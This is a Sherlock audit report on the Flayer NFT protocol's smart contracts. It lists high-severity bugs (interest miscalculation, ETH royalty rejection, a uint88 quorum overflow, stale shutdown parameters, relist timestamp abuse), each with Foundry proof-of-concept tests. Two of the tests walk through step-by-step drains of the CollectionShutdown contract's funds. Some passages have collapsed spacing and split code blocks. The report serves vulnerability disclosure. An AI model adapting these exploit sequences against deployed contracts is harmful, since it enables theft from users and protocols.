# H-3 - Quorum overflow in CollectionShutdown leads to complete drain of contract\u0027s funds

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Flayer
**Keywords:** CollectionShutdown, quorum overflow, drain funds, totalSupply, MAX_SHUTDOWN_TOKENS, denomination, quorumVotes, shutdown process, Sudoswap, claimants, overflow, vulnerability, financial loss, test case, recommendation, manual review, contract, protocol, user

---

# Issue H-1: Frequency-dependent TaxCalculator

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/117)  
Found by: kuprum  

TaxCalculator.sol::calculateCompoundedFactor uses discrete formula for calculating the compounded factor. Combined with the wrong divisor (1000 instead of 10_000, as I outline in another finding), when collection\u0027s utilization factor is moderately high (e.g. 90%), and the operations with the collection happen relatively frequently (e.g. every day), this leads to charging users excessive interest rates: for this example, 3200% more than expected.  
If the divisor is fixed to the correct value (10_000), then the effects from using the discrete formula are less severe, but still quite substantial: namely for a 100% collection utilization, depending on the frequency, either the user will be charged up to e−2 ≈ 71% more interest per year compared to the non-compound interest, or the protocol will receive up to 1−1/(e−1) ≈ 42% less interest per year compared to the compound interest.  
It\u0027s worth noting that calculateCompoundedFactor is called whenever a new checkpoint is created for the collection, which happens e.g. when any user creates a listing, cancels a listing, or fills a listing. This is neither enough to reach the desired precision, nor is it gas efficient.  
Depending on the frequency of collection operations, either:  
- If non-compound interest is expected, but the frequency is high, then the users will be charged up to 71% more interest than they expect;  
- If compound interest is expected, but the frequency is low, then the protocol will receive up to 42% less interest than it expects.  

TaxCalculator.sol::calculateCompoundedFactor employs the following formula:
compoundedFactor_ = _previousCompoundedFactor * (1e18 + (perSecondRate / 1000 * _timePeriod)) / 1e18;

As I explain in another finding, the divisor 1000 is incorrect, and has to be fixed to 10_000. Provided this is fixed, the resulting formula is the correct discrete formula for calculating the compounded interest. The problem is that the formula will give vastly different results depending on the frequency of operations which have nothing to do with the user who holds the protected listing.

Varying frequency of collection operations.

none

No attack is necessary. The interest rates will be wrongly calculated in most cases.

Either users are charged up to 71% more interest than they expect, or the protocol receives up to 42% less interest than it expects.

Drop this test to TaxCalculator.t.sol, and execute with forge test --match-test test_WrongInterestCalculation

\u0060\u0060\u0060solidity
// This test uses the unmodified source code, with the wrong divisor of 1000
function test_WrongInterestCalculation() public view {
    // We fix collection utilization to 90%
    uint utilization = 0.9 ether;
    // New checkpoints with the updated compoundedFactor are created
    // and stored whenever there is activity wrt. the collection
    // The expected interest multiplier after 1 year
    uint expectedFactor =
        taxCalculator.calculateCompoundedFactor(1 ether, utilization, 365 days);
    // The resulting interest multiplier if some activity happens every day
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
uint compoundedFactor = 1 ether;
for (uint time = 0; time < 365 days; time += 1 days) {
    compoundedFactor =
        taxCalculator.calculateCompoundedFactor(compoundedFactor, utilization,
        1 days);
}
// The user loss due to the activity which doesn\u0027t concern them is 3200%
assertApproxEqRel(
    33 ether * expectedFactor / 1 ether,
    compoundedFactor,
    0.01 ether);
}
\u0060\u0060\u0060
## Variant 1: If non-compound interest is desired, apply this diff:
\u0060\u0060\u0060diff
diff --git a/flayer/src/contracts/TaxCalculator.sol
b/flayer/src/contracts/TaxCalculator.sol
index 915c0ff..4031aba 100644
--- a/flayer/src/contracts/TaxCalculator.sol
+++ b/flayer/src/contracts/TaxCalculator.sol
@@ -87,7 +87,7 @@ contract TaxCalculator is ITaxCalculator {
    uint perSecondRate = (interestRate * 1e18) / (365 * 24 * 60 * 60);
    // Calculate new compounded factor
-    compoundedFactor_ = _previousCompoundedFactor * (1e18 + (perSecondRate /
    1000 * _timePeriod)) / 1e18;
+    compoundedFactor_ = _previousCompoundedFactor + (perSecondRate *
    _timePeriod / 1000);
}
\u0060\u0060\u0060

**Note:** In the above the divisor is still unfixed, as this belongs to a different finding.

### Variant 2: If compound interest is desired, employ either periodic per-second compounding, or continuous compounding with exponentiation. Any of these approaches are precise enough and much more gas efficient than the current one, but require substantial refactoring.


kuprumxyz

For clarification of this finding impact (for future reference), I add here some more data that I\u0027ve demonstrated during the judging period.
## TextedPoC: Unfair interest rate can be enforced on users

Suppose there are two collections, A and B, with the same utilization rate, i.e. the interest rate charged for them should be the same. A malicious user wants to inflict excess interest rate on the users of collection B, and repeatedly does create Listings/cancel Listings for an NFT from collection B. The only thing a malicious user loses is paying gas fees which are negligible; but the effect of the attack is that all users of collection B pay up to 71% more interest rate than users of collection A, thought they should pay the same.

Interest rate and compounded factor are calculated per collection, and all the logic described in this finding applies per collection. I.e. only the activity (or inactivity) per collection is relevant for the frequency-dependent calculation of interest rates. It may well be the case that some collections are used frequently, and the protocol may be perfectly healthy and well-working, but for infrequently used collections either users or the protocol suffer the losses described.

## The updated code PoC

Some Watsons have raised a concern that the PoC supplied with the finding shows only the loss of 11% if the wrong divisor vulnerability is fixed. The point is that the PoC supplied with this finding is made specifically for the case when it\u0027s unfixed. It also employs 90% utilization rate, and compares the principal sum + interest, instead of only the interest without principal sum, how it should be. Below we supply the updated PoC which addresses this.

Please fix the wrong divisor vulnerability as described, place the below PoC to TaxCalculator.t.sol, and execute with forgetest --match-test test allowbreak _WrongInterestCalculation.

\u0060\u0060\u0060solidity
function test_WrongInterestCalculation() public {
    // We fix the utilization to 100%
    uint utilization = 1 ether;
    // New checkpoints with the updated compoundedFactor are created
    // and stored whenever there is activity wrt. the collection
    // The expected interest multiplier after 1 year
    uint expectedFactor =
        taxCalculator.calculateCompoundedFactor(1 ether, utilization, 365 days);
    // The resulting interest multiplier if some activity happens every day
    uint compoundedFactor = 1 ether;
    for (uint time = 0; time < 365 days; time += 1 days) {
        compoundedFactor =
            taxCalculator.calculateCompoundedFactor(compoundedFactor, utilization, 1 days);
    }
    // User interest loss due to the activity which doesn\u0027t concern them is 71%
}
\u0060\u0060\u0060
## Interest Losses Calculations

In order to settle the numerical questions once and for all, I\u0027ve created this spreadsheet, which calculates both user and protocol losses depending on the frequency (the number of compounding intervals per year). The spreadsheet contains more data, but here is the excerpt from it, for 100% interest rate:

| Intervals per year | Interest | Max interest | User interest loss | Protocol interest loss |
|--------------------|----------|--------------|--------------------|-----------------------|
| 1 (yearly)         | 100.00%  | 171.83%      | 71.83%             | 41.80%                |
| 4 (quarterly)      | 144.14%  | 171.83%      | 19.21%             | 16.11%                |
| 12 (monthly)       | 161.30%  | 171.83%      | 6.52%              | 6.13%                 |
| 52 (weekly)        | 169.26%  | 171.83%      | 1.52%              | 1.49%                 |
| 365 (daily)        | 171.46%  | 171.83%      | 0.22%              | 0.22%                 |

User losses are calculated under the assumption of the PoC: Unfair interest rate can be enforced on users supplied before, i.e. when a malicious user creates additional activity for the collection. Protocol losses don\u0027t require any attack, and happen by themselves, due to interest rates being frequency-dependent, and the relatively low collection activity.

It can be seen that with weekly activity _within a specific collection_ (which is not an excessive limitation), the losses exceed 1% which qualifies this finding to be High severity:
- Definite loss of funds without (extensive) limitations of external conditions.
- The loss of the affected party must exceed 1%.

Let me stress this again: Within a _specific protocol_ (one of many), with relevant NFT operations from a _specific NFT collection_ (this finding applies to each NFT collection separately, and only a small subset of NFTs from that collection will be employed within the protocol), moreover, concerning only listings (which is a subset of the protocol functionality), _weekly activity_ (i.e. a listing for that collection being created or filled) is...
notanexcessivelimitation. NFTs are not the same market as fungible tokens (e.g. USDC, DAI, etc.): operations with them don\u0027t happen frequently.
## Issue H-2: ERC1155Bridgable.sol cannot receive ETH royalties

**Source:** [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/140)  
**Found by:** Ironsidesec, Mohammed Rizwan, Opa Batyo, Zany Bonzy, heeze, merlin

ERC1155Bridgable.sol cannot receive ETH, so any attempts for royalty sources to send ETH to the contract will fail, and as a result, users cannot claim their ERC1155 royalties.

ERC1155Bridgable.sol holds the claimRoyalties function which allows users, through the INFERNAL_RIFT_BELOW to claim their royalties, ETH token or otherwise. However, when dealing with ETH, the contract has no payable receive or fallback function, and as a result cannot receive ETH. Thus, users cannot claim their ETH royalties.

\u0060\u0060\u0060solidity
function claimRoyalties(address _recipient, address[] calldata _tokens) external {
    if (msg.sender != INFERNAL_RIFT_BELOW) {
        revert NotRiftBelow();
    }
    // We can iterate through the tokens that were requested and transfer them all
    // to the specified recipient.
    uint tokensLength = _tokens.length;
    for (uint i; i < tokensLength; ++i) {
        // Map our ERC20
        ERC20 token = ERC20(_tokens[i]);
        // If we have a zero-address token specified, then we treat this as native ETH
        if (address(token) == address(0)) {
            SafeTransferLib.safeTransferETH(_recipient,
            payable(address(this)).balance);
        } else {
            SafeTransferLib.safeTransfer(token, _recipient,
            token.balanceOf(address(this)));
        }
    }
}
\u0060\u0060\u0060

Contract cannot receive ETH, and as a result, users cannot claim their royalties, leading to loss of funds.  
Add the test code below to \u0060RiftTest.t.sol\u0060, and run it with \u0060forge test --mt test_bridged1155CannotReceiveETH\u0060.

\u0060\u0060\u0060solidity
function test_bridged1155CannotReceiveETH() public {
    l1NFT1155.mint(address(this), 0, 1);
    l1NFT1155.setApprovalForAll(address(riftAbove), true);
    address[] memory collections = new address[](1);
    collections[0] = address(l1NFT1155);
    uint[][] memory idList = new uint[][](1);
    uint[] memory ids = new uint[](1);
    ids[0] = 0;
    idList[0] = ids;
    uint[][] memory amountList = new uint[][](1);
    uint[] memory amounts = new uint[](1);
    amounts[0] = 1;
    amountList[0] = amounts;
    mockPortalAndMessenger.setXDomainMessenger(address(riftAbove));
    riftAbove.crossTheThreshold1155(
        _buildCrossThreshold1155Params(collections, idList, amountList,
        address(this), 0)
    );
    Test1155 l2NFT1155 =
        Test1155(riftBelow.l2AddressForL1Collection(address(l1NFT1155), true));
    address RoyaltyProvider = makeAddr("RoyaltyProvider");
    vm.deal(RoyaltyProvider, 10 ether);
    vm.expectRevert();
    vm.prank(RoyaltyProvider);
    (bool success, ) = address(l2NFT1155).call{value: 10 ether}("");
    assert(success);
    vm.stopPrank();
}
\u0060\u0060\u0060

The test passes because we are expecting a reversion with EvmError as the contract cannot receive ETH. Hence there\u0027s no ETH for the users to claim.  
\u0060\u0060\u0060
[0] VM::expectRevert(custom error f4844814:)
[0] VM::prank(RoyaltyProvider: [0x5D4FfD958F2bfe55BfC8B0602A8C066E2D7eeBa8])
\u0060\u0060\u0060
\u0060\u0060\u0060
[201] 0x094bb35C5C8E23F2A873541aDb8c5e464C29c668::fallback{value: 10000000000000000000}()
\u0060\u0060\u0060
\u0060\u0060\u0060
[45] ERC1155Bridgable::fallback{value: 10000000000000000000}() [delegatecall]
\u0060\u0060\u0060
\u0060\u0060\u0060
← [Revert] EvmError: Revert
\u0060\u0060\u0060
\u0060\u0060\u0060
← [Revert] EvmError: Revert
\u0060\u0060\u0060
\u0060\u0060\u0060
[0] VM::stopPrank()
\u0060\u0060\u0060

CodeSnippet  
https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/moongate/src/libs/ERC1155Bridgable.sol#L116C1-L135C6  

Toolused  
ManualReview  

Recommendation  
Add a payable receive function to the contract.
## Issue H-3: Quorum overflow in CollectionShutdown leads to complete drain of contract\u0027s funds

Source: [GitHub Issue #146](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/146)

Found by: 0xc0ffEE, Audinarey, Ragnarok, Ruhum, almantare, araj, asui, blockchain555, h2134, kuprum, zzykxx


CollectionShutdown.sol#150 and CollectionShutdown.sol#L247 cast quorum votes to uint88 as follows:

\u0060\u0060\u0060solidity
uint totalSupply = params.collectionToken.totalSupply();
if (totalSupply > MAX_SHUTDOWN_TOKENS * 10 ** params.collectionToken.denomination()) revert TooManyItems();
// Set our quorum vote requirement
params.quorumVotes = uint88(totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT);
\u0060\u0060\u0060

The problem with the above is that it may overflow:
- collectionToken.denomination() may max 9
- MAX_SHUTDOWN_TOKENS == 4
- SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT == 1/2
- Collection tokens are minted in Locker as follows:
  - token.mint(_recipient, tokenIdsLength * 1 ether * 10 ** token.denomination());

E.g. with totalSupply == 0.6190 ether * 10 ** 9, we have that the check still passes, but:
- totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT = 0.3095 ether * 10 ** 9
- type(uint88).max = 0.309485 ether * 10 ** 9
- uint88(0.3095 ether * 10 ** 9) = 0.000015 ether * 10 ** 9

Upon collection shutdown, tokens are sold on Sudoswap, and the funds thus obtained are distributed among the claimants. The claimed amount is then divided by quorumVotes as follows:
\u0060\u0060\u0060solidity
uint amount = params.availableClaim * claimableVotes / (params.quorumVotes *
             ONE_HUNDRED_PERCENT / SHUTDOWN_QUORUM_PERCENT);
\u0060\u0060\u0060
Thus, when dividing by a much smaller quorumVotes, the claimant receives much more than they are eligible for: in the PoC it\u0027s 20647 ether though only 1 ether has been received from sales.

CollectionShutdown.sol#150 and CollectionShutdown.sol#L247 downcast the quorum votes to uint88, which may overflow.

1. The collection token denomination needs to be sufficiently large to cause overflow.
2. The amount of shutdown votes needs to be sufficiently large to cause overflow.

none

1. A user creates a collection with denomination 9.
2. The user holding 0.6190 ether * 10**9 of the collection token (i.e. less than 1 NFT) starts collection shutdown.
   - At that point the quorum of votes overflows, and becomes much smaller.
3. Collection shutdown is executed normally.
4. Tokens are sold on Sudoswap.
   - In the PoC they are sold for 1 ether.
5. User claims the balance. Due to the overflow, they receive much more than what their NFTs were worth.
   - In the PoC user receives 20647 ether though only 1 ether has been received from sales.

The protocol suffers unbounded losses (the whole balance of CollectionShutdown contract can be drained).

DropthistesttoCollectionShutdown.t.solandexecutewithforgetest--match-testtest_

QuorumOverflow:
\u0060\u0060\u0060solidity
function test_QuorumOverflow() public {
    locker.createCollection(address(erc721c), \u0027Test Collection\u0027, \u0027TEST\u0027, 9);
    // Initialize our collection, without inflating \u0060totalSupply\u0060 of the
    {CollectionToken}
    locker.setInitialized(address(erc721c), true);
    // Set our collection token for ease for reference in tests
    collectionToken = locker.collectionToken(address(erc721c));
    // Approve our shutdown contract to use test suite\u0027s tokens
    collectionToken.approve(address(collectionShutdown), type(uint).max);
    // Give some initial balance to CollectionShutdown contract
    vm.deal(address(collectionShutdown), 30000 ether);
    vm.startPrank(address(locker));
    // Suppose address(1) holds 0.6190 ether
    // in a collection token with denomination 9
    collectionToken.mint(address(1), 0.6190 ether * 10**9);
    vm.stopPrank();
    // Start collection shutdown from address(1)
    vm.startPrank(address(1));
    collectionToken.approve(address(collectionShutdown), 0.6190 ether * 10**9);
    collectionShutdown.start(address(erc721c));
    vm.stopPrank();
    // Mint NFTs into our collection {Locker} and process the execution
    uint[] memory tokenIds = _mintTokensIntoCollection(erc721c, 3);
    collectionShutdown.execute(address(erc721c), tokenIds);
    // Mock the process of the Sudoswap pool liquidating the NFTs for ETH.
    vm.startPrank(SUDOSWAP_POOL);
    // Transfer the specified tokens away from the Sudoswap position to simulate a
    purchase
    for (uint i; i < tokenIds.length; ++i) {
        erc721c.transferFrom(SUDOSWAP_POOL, address(5), i);
    }
    // Ensure the sudoswap pool has enough ETH to send
    deal(SUDOSWAP_POOL, 1 ether);
    // Send ETH from the Sudoswap Pool into the {CollectionShutdown} contract
    (bool sent,) = payable(address(collectionShutdown)).call{value: 1 ether}(\u0027\u0027);
    require(sent, \u0027Failed to send {CollectionShutdown} contract\u0027);
    vm.stopPrank();
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// Get our start balances so that we can compare to closing balances from claim
uint startBalanceAddress = payable(address(1)).balance;
// address(1) now can claim
collectionShutdown.claim(address(erc721c), payable(address(1)));
// Due to quorum overflow, address(1) now holds ~ 20647 ether
assertApproxEqRel(payable(address(1)).balance - startBalanceAddress, 20647 ether, 0.01 ether);
\u0060\u0060\u0060

Mitigation
Employ the appropriate type and cast for quorumVotes, e.g. uint92.
## Issue H-4: In the Listings.sol#relist() function, listing.created is not set to block.timestamp.

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/164)

Found by: 0xAlix2, Audinarey, Ollam, ZeroTrust, araj, blockchain555, cawfree, cnsdkc007, dany.armstrong90, h2134, jecikpo, ydlee, zraxx, zzykxx

The core functionality of the protocol can be blocked by malicious users by not setting listing.created to block.timestamp in the function.

In the Listings.sol#relist() function, listing.created is not set to block.timestamp and it is determined based on the input parameter.

No response

- When a collection is illiquid and we have a disparate number of tokens spread across multiple users, a pool has to become unusable.

- In , a malicious user sets listing.created to type(uint).max instead of block.timestamp in the Listings.sol#relist() function.
- Next, when a collection is illiquid and we have a disparate number of tokens spread across multiple users, a pool has to become unusable.
- In , is always true, so the CollectionShutdown.sol#execute() function is always reverted.
The Collection Shutdown function that is core function of the protocol is damaged.

\u0060\u0060\u0060solidity
function test_CanRelistFloorItemAsLiquidListing(address _lister, address payable _relister, uint _tokenId, uint16 _floorMultiple) public {
    // Ensure that we don\u0027t get a token ID conflict
    _assumeValidTokenId(_tokenId);
    // Ensure that we don\u0027t set a zero address for our lister and filler, and that they
    // aren\u0027t the same address
    _assumeValidAddress(_lister);
    _assumeValidAddress(_relister);
    vm.assume(_lister != _relister);
    // Ensure that our listing multiplier is above 1.00
    _assumeRealisticFloorMultiple(_floorMultiple);
    // Provide a token into the core Locker to create a Floor item
    erc721a.mint(_lister, _tokenId);
    vm.startPrank(_lister);
    erc721a.approve(address(locker), _tokenId);
    uint[] memory tokenIds = new uint[](1);
    tokenIds[0] = _tokenId;
    // Rather than creating a listing, we will deposit it as a floor token
    locker.deposit(address(erc721a), tokenIds);
    vm.stopPrank();
    // Confirm that our listing user has received the underlying ERC20. From
    // the deposit this will be a straight 1:1 swap.
    ICollectionToken token = locker.collectionToken(address(erc721a));
    assertEq(token.balanceOf(_lister), 1 ether);
    vm.startPrank(_relister);
    // Provide our filler with sufficient, approved ERC20 tokens to make the relist
    uint startBalance = 0.5 ether;
    deal(address(token), _relister, startBalance);
    token.approve(address(listings), startBalance);
}
\u0060\u0060\u0060
// Relist our floor item into one of various collections
listings.relist({
    _listing: IListings.CreateListing({
        collection: address(erc721a),
        tokenIds: _tokenIdToArray(_tokenId),
        listing: IListings.Listing({
            owner: _relister,
            created: uint40(type(uint32).max),
            duration: listings.MIN_LIQUID_DURATION(),
            floorMultiple: _floorMultiple
        })
    }),
    _payTaxWithEscrow: false
});
vm.stopPrank();
// Confirm that the listing has been created with the expected details
IListings.Listing memory _listing = listings.listings(address(erc721a),
    _tokenId);
assertEq(_listing.created, block.timestamp);
}
Result:
Ran 1 test suite in 17.20ms (15.77ms CPU time): 0 tests passed, 1 failed, 0 skipped
(1 total tests)
Failing tests:
Encountered 1 failing test in test/Listings.t.sol:ListingsTest
[FAIL. Reason: assertion failed: 4294967295 != 3601; counterexample:
calldata=0x102a3f2c0000000000000000000000007b71078b91e0cdf997ea0019ceaaec1e461a⌋
64ca0000000000000000000000000a255597a7458c26b0d008204a1336eb2fd6aa0900000000000⌋
00000000000000000000000000000000000000005c3b7d197caff00000000000000000000000000⌋
0000000000000000000000000000000000006d
args=[0x7b71078b91E0CdF997EA0019cEaAeC1E461A64cA,
0x0A255597a7458C26B0D008204A1336EB2fD6AA09, 1622569146370815 [1.622e15], 109]]
test_CanRelistFloorItemAsLiquidListing(address,address,uint256,uint16) (runs:
0, ￿: 0, ~: 0)
Encountered a total of 1 failing tests, 0 tests succeeded
Mitigation
Add the following lines to the Listings.sol#relist() function:
\u0060\u0060\u0060solidity
function relist(CreateListing calldata _listing, bool _payTaxWithEscrow) public
    nonReentrant lockerNotPaused {
    // Load our tokenId
    address _collection = _listing.collection;
    uint _tokenId = _listing.tokenIds[0];
    // Read the existing listing in a single read
    Listing memory oldListing = _listings[_collection][_tokenId];
    // Ensure the caller is not the owner of the listing
    if (oldListing.owner == msg.sender) revert CallerIsAlreadyOwner();
    // Load our new Listing into memory
    Listing memory listing = _listing.listing;
    // Ensure that the existing listing is available
    (bool isAvailable, uint listingPrice) = getListingPrice(_collection, _tokenId);
    if (!isAvailable) revert ListingNotAvailable();
    // We can process a tax refund for the existing listing
    (uint _fees,) = _resolveListingTax(oldListing, _collection, true);
    if (_fees != 0) {
        emit ListingFeeCaptured(_collection, _tokenId, _fees);
    }
    // Find the underlying {CollectionToken} attached to our collection
    ICollectionToken collectionToken = locker.collectionToken(_collection);
    // If the floor multiple of the original listings is different, then this needs
    // to be paid to the original owner of the listing.
    uint listingFloorPrice = 1 ether * 10 ** collectionToken.denomination();
    if (listingPrice > listingFloorPrice) {
        unchecked {
            collectionToken.transferFrom(msg.sender, oldListing.owner, listingPrice - listingFloorPrice);
        }
    }
    // Validate our new listing
    _validateCreateListing(_listing);
    // Store our listing into our Listing mappings
    _listings[_collection][_tokenId] = listing;
    _listings[_collection][_tokenId].created = uint40(block.timestamp);
    // Pay our required taxes
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
payTaxWithEscrow(address(collectionToken), getListingTaxRequired(listing,
            _collection), _payTaxWithEscrow);
// Emit events
emit ListingRelisted(_collection, _tokenId, listing);
\u0060\u0060\u0060
## Issue H-5: Stale shutdown params can be reused to drain all funds from Collection Shutdown contract

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/173)  
Found by: 0xc0ffEE, ZeroTrust, kuprum  

When a collection is being shutdown via Collection Shutdown contract, the shutdown parameters are not properly cleaned up, and can be reused to mount an attack on the contract. In particular, a new collection can be created for the same ERC-721 contract, and then a shutdown may be started again via a particular sequence of calls: \u0060reclaimVote -> start\u0060. As Collection Shutdown indexes all internal data structures and external operations via the address of the ERC-721 contract, this leads to mixing the outdated shutdown parameters with the parameters of the new collection (in particular the old and the new collection token). Moreover, as attacker\u0027s balance of the new collection token is now used instead of the old one, the attacker can claim (via \u0060voteAndClaim\u0060) much more than was received from the token sale of the old collection, thus draining all contract funds.

The execution logic of certain functions of Collection Shutdown is flawed; in particular:
- Method \u0060reclaimVote\u0060 can be called after the shutdown process started to execute;
- Execution of method \u0060start\u0060 is guarded by the precondition \u0060params.shutdownVotes == 0\u0060, which can be made true by the above function \u0060reclaimVote\u0060. Besides that, \u0060start\u0060 leaves stale data in \u0060CollectionShutdownParams\u0060.

none  

none

1. The attacker creates a collection for some ERC-721 contract
2. The attacker deposits an NFT, and receives 1 ether of collection token
3. The attacker starts collection shutdown from address (1)
4. Shutdown executed normally; some tokens are posted to Sudoswap for sale
5. The attacker buys NFTs for 100 ether
6. The attacker reclaims their vote, to enable starting the shutdown again
7. The attacker creates a new collection for the same ERC-721 contract; a new collection token is created by Locker
8. The attacker deposits an NFT, and receives 1 ether of the new collection token
9. The attacker starts collection shutdown again from address (1); this redirects collection token to the new one in shutdown params
10. The attacker deposits NFTs, and receives 11 ether of the new collection token to address (2)
11. Attacker votes and claims, reusing stale, partially updated shutdown params
12. There were 100 ether received from Sudoswap sale upon the first shutdown. As now the attacker claims with their balance of collectionToken2 == 11 ether, they receive 100 ether * 11 == 1100 ether, thus stealing 1000 ether.


All funds are drained from the CollectionShutdown contract.


Drop this test to CollectionShutdown.t.sol and execute with forge test --match-test test_ReuseShutdownParamsToStealFunds:

\u0060\u0060\u0060solidity
function test_ReuseShutdownParamsToStealFunds() public {
    // Some initial balance of CollectionShutdown
    vm.deal(address(collectionShutdown), 1000 ether);
    // 1. The attacker creates a collection for some ERC-721 contract (done in the test setup)
    // 2. The attacker deposits an NFT, and receives 1 ether of collection token
    vm.startPrank(address(locker));
    collectionToken.mint(address(1), 1 ether);
    vm.stopPrank();
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// 3. The attacker starts collection shutdown from address(1)
vm.startPrank(address(1));
collectionToken.approve(address(collectionShutdown), 1 ether);
collectionShutdown.start(address(erc721b));
vm.stopPrank();
// 4. Shutdown executed normally; some tokens are posted to Sudoswap for sale
// Mint NFTs into our collection {Locker} and process the execution
uint[] memory tokenIds = _mintTokensIntoCollection(erc721b, 3);
collectionShutdown.execute(address(erc721b), tokenIds);
// Mock the process of the Sudoswap pool liquidating the NFTs for ETH.
// 5. The attacker buys NFTs for 100 ether
_mockSudoswapLiquidation(SUDOSWAP_POOL, tokenIds, 100 ether);
// 6. The attacker reclaims their vote, to enable starting the shutdown again
vm.startPrank(address(1));
collectionShutdown.reclaimVote(address(erc721b));
vm.stopPrank();
// 7. The attacker creates a new collection for the same ERC-721
locker.createCollection(address(erc721b), \u0027Test Collection\u0027, \u0027TEST\u0027, 0);
// Initialize our collection, without inflating \u0060totalSupply\u0060 of the
// {CollectionToken}
locker.setInitialized(address(erc721b), true);
// A new collection token is created by Locker
ICollectionToken collectionToken2 = locker.collectionToken(address(erc721b));
// 8. The attacker deposits an NFT, and receives 1 ether of the new collection
// token
vm.startPrank(address(locker));
collectionToken2.mint(address(1), 1 ether);
vm.stopPrank();
// 9. The attacker starts collection shutdown again from address(1)
// This redirects collection token to the new one in shutdown params
vm.startPrank(address(1));
collectionToken2.approve(address(collectionShutdown), 1 ether);
collectionShutdown.start(address(erc721b));
vm.stopPrank();
// 10. The attacker deposits NFTs,
// and receives 11 ether of the new collection token to address(2)
vm.startPrank(address(locker));
collectionToken2.mint(address(2), 11 ether);
vm.stopPrank();
// Get our start balances so that we can compare to closing balances from claim
uint startBalanceAddress = payable(address(2)).balance;
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// 11. The attacker votes and claims, reusing stale, partially updated shutdown
vm.startPrank(address(2));
collectionToken2.approve(address(collectionShutdown), 11 ether);
collectionShutdown.voteAndClaim(address(erc721b));
vm.stopPrank();
// 12. There were 100 ether received from Sudoswap sale upon the first shutdown.
// As now attacker claims with the balance of collectionToken2 == 11 ether,
// they receive 100 ether * 11 == 1100 ether, thus stealing 1000 ether
assertEq(payable(address(2)).balance - startBalanceAddress, 1100 ether);
\u0060\u0060\u0060

Mitigation
- Disallow calling reclaimVote at any point in time after the shutdown can be executed.
- In start, properly clean up all CollectionShutdownParams.

Additionally, we recommend for the CollectionShutdown contract to index both internal data structures and external functions not with the address of an ERC-721 contract, but with the address of a collection token contract. This will help to clearly differentiate between various reincarnations of the same ERC-721 contract as different collections/collection tokens, as well as to enable cleanly shutting down the collection even if some operations are still performed with the ERC-721 tokens.
## Issue H-6: There is a calculation error inside the calculateCompoundedFactor() function, causing users to overpay interest.

Source: [GitHub Issue #227](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/227)

Found by: 0x37, Sentryx, Tendency, ZeroTrust, dany.armstrong90, dimulski, kuprum, merlinboii, robertodf, stuart_the_minion

There is a calculation error inside the calculateCompoundedFactor() function, causing users to overpay interest.

\u0060\u0060\u0060solidity
function calculateProtectedInterest(uint _utilizationRate) public pure returns (uint interestRate_) {
    // If we haven\u0027t reached our kink, then we can just return the base fee
    if (_utilizationRate <= UTILIZATION_KINK) {
        // Calculate percentage increase for input range 0 to 0.8 ether (2% to 8%)
        interestRate_ = 200 + (_utilizationRate * 600) / UTILIZATION_KINK;
    }
    // If we have passed our kink value, then we need to calculate our additional fee
    else {
        // Convert value in the range 0.8 to 1 to the respective percentage between 8% and 100% and make it accurate to 2 decimal places.
        interestRate_ = (((_utilizationRate - UTILIZATION_KINK) * (100 - 8)) / (1 ether - UTILIZATION_KINK) + 8) * 100;
    }
}

function calculateCompoundedFactor(uint _previousCompoundedFactor, uint _utilizationRate, uint _timePeriod) public view returns (uint compoundedFactor_) {
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// Get our interest rate from our utilization rate
uint interestRate = this.calculateProtectedInterest(_utilizationRate);
// Ensure we calculate the compounded factor with correct precision.
\u0060interestRate\u0060 is
// in basis points per annum with 1e2 precision and we convert the annual
// rate to per second rate.
uint perSecondRate = (interestRate * 1e18) / (365 * 24 * 60 * 60);
// Calculate new compounded factor
compoundedFactor_ = _previousCompoundedFactor * (1e18 + (perSecondRate / 1000 * _timePeriod)) / 1e18;
}
\u0060\u0060\u0060

ThroughthecalculateProtectedInterest()function,whichcalculatestheannualinterest rate, weknowthat200represents2%and800represents8%,sothedecimalprecisionis 4. Whentheprincipalis100andtheannualinterestrateis2%(200),theyearlyinterest shouldbecalculatedas100*200/10000=2. However,inthecalculateCompoundedFactorfunction,thereisaclearerrorwhen calculatingcompoundinterest,asitonlydividesby1000,leadingtotheinterestbeing multiplied by a factor of 10.

Theuseroverpaidinterest,resultinginfinancialloss.

[Code Snippet 1](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/TaxCalculator.sol#L80)  
[Code Snippet 2](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/TaxCalculator.sol#L59C1-L71C6)

Manual Review

\u0060\u0060\u0060solidity
function calculateCompoundedFactor(uint _previousCompoundedFactor, uint _utilizationRate, uint _timePeriod) public view returns (uint compoundedFactor_) {
    // Get our interest rate from our utilization rate
\u0060\u0060\u0060
uint interestRate = this.calculateProtectedInterest(_utilizationRate);
// Ensure we calculate the compounded factor with correct precision.
\u0060interestRate\u0060 is
// in basis points per annum with 1e2 precision and we convert the annual
// rate to per
// second rate.
uint perSecondRate = (interestRate * 1e18) / (365 * 24 * 60 * 60);
// Calculate new compounded factor
compoundedFactor_ = _previousCompoundedFactor * (1e18 + (perSecondRate /
10000 * _timePeriod)) / 1e18;
## Issue H-7: User can pay less protected listing fees

Source: [GitHub Issue #243](https://github.com/sherlock-audit/2024-08-flayer-judging/issues/243)  
Found by: dany.armstrong90, jsmi  

ProtectedListings.unlockProtectedListing() function create checkpoint after decrease listingCount[_collection]. Therefore, when user unlock multiple protected listings, user will pay less fees for the second and thereafter listings than the first listing.  

ProtectedListings.unlockProtectedListing() function is following.  
\u0060\u0060\u0060solidity
function unlockProtectedListing(address _collection, uint _tokenId, bool _withdraw) public lockerNotPaused {
